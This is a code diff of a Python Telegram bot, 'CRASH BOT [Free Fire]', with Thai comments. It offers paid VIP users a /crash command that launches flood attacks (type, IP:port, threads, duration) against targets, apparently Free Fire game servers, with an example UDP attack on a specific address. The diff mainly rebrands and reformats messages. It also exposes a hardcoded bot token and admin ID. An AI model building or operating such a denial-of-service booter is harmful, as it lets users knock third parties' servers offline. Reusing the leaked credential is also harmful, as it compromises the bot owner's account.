@@ -6,7 +6,7 @@ import time
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# ตั้งค่าข้อมูลบอทและแอดมิน
+# --- ตั้งค่าข้อมูลบอทและแอดมิน ---
 BOT_TOKEN = "7929038707:AAHq52QK_p2TLxSPF4f-Q51Fb8oV1uIM9qc"
 ADMIN_ID = 7520172820
 START_PY_PATH = "start.py"
@@ -16,9 +16,11 @@ db_lock = Lock()
 cooldowns = {}
 active_attacks = {}
 
-# เชื่อมต่อฐานข้อมูล SQLite
+# --- เชื่อมต่อฐานข้อมูล SQLite ---
 conn = sqlite3.connect("users.db", check_same_thread=False)
 cursor = conn.cursor()
+
+# สร้างตาราง vip_users หากยังไม่มี
 cursor.execute(
     """
     CREATE TABLE IF NOT EXISTS vip_users (
@@ -30,7 +32,7 @@ cursor.execute(
 )
 conn.commit()
 
-# คำสั่ง /start
+# --- คำสั่ง /start ---
 @bot.message_handler(commands=["start"])
 def handle_start(message):
     telegram_id = message.from_user.id
@@ -66,25 +68,19 @@ def handle_start(message):
     bot.reply_to(
         message,
         (
-            "🤖 *ยินดีต้อนรับสู่ CRASH BOT [Free Fire]!*"
-            f"""
-{vip_status}
-\n"""
-            "📌 *วิธีใช้งาน:*"
-            """
-/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>
-\n"""
- "💡 *ตัวอย่าง:*"
-            """
-/crash UDP 143.92.125.230:10013 10 900
-\n"""
-            "💠 KrizzZModz 🇵🇪 USERS VIP 💠"
+            "🤖 *ยินดีต้อนรับสู่ CRASH BOT [Free Fire]!*\n"
+            f"{vip_status}\n\n"
+            "📌 *วิธีใช้งาน:*\n"
+            "/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>\n\n"
+            "💡 *ตัวอย่าง:*\n"
+            "/crash UDP 143.92.125.230:10013 10 900\n\n"
+            "⚡ BSCKH⚕️ - VIP SECTION ⚡"
         ),
         reply_markup=markup,
         parse_mode="Markdown",
     )
 
-# คำสั่ง /vip (เพิ่ม VIP)
+# --- คำสั่ง /vip (เพิ่ม VIP) ---
 @bot.message_handler(commands=["vip"])
 def handle_addvip(message):
     if message.from_user.id != ADMIN_ID:
@@ -116,7 +112,7 @@ def handle_addvip(message):
 
     bot.reply_to(message, f"✅ เพิ่ม {telegram_id} เป็น VIP เป็นเวลา {days} วันเรียบร้อยแล้ว!")
 
-# คำสั่ง /crash (เริ่มการโจมตี)
+# --- คำสั่ง /crash (เริ่มการโจมตี) ---
 @bot.message_handler(commands=["crash"])
 def handle_crash(message):
     telegram_id = message.from_user.id
@@ -177,13 +173,13 @@ def handle_crash(message):
             f"⚙️ *ประเภท:* {attack_type}\n"
             f"🧟‍♀️ *เธรด:* {threads}\n"
             f"⏳ *ระยะเวลา (ms):* {duration}\n\n"
-            f"💠 KrizzZModz 🇵🇪 USERS VIP 💠"
+            "⚡ BSCKH⚕️ - VIP SECTION ⚡"
         ),
         reply_markup=markup,
         parse_mode="Markdown",
     )
 
-# ปุ่มหยุดการโจมตี
+# --- ปุ่มหยุดการโจมตี ---
 @bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
 def handle_stop_attack(call):
     telegram_id = int(call.data.split("_")[1])
@@ -209,5 +205,6 @@ def handle_stop_attack(call):
     else:
         bot.answer_callback_query(call.id, "❌ ไม่พบการโจมตีใดๆ ที่กำลังทำงานอยู่!")
 
+# --- เริ่มบอท ---
 if __name__ == "__main__":
     bot.infinity_polling()
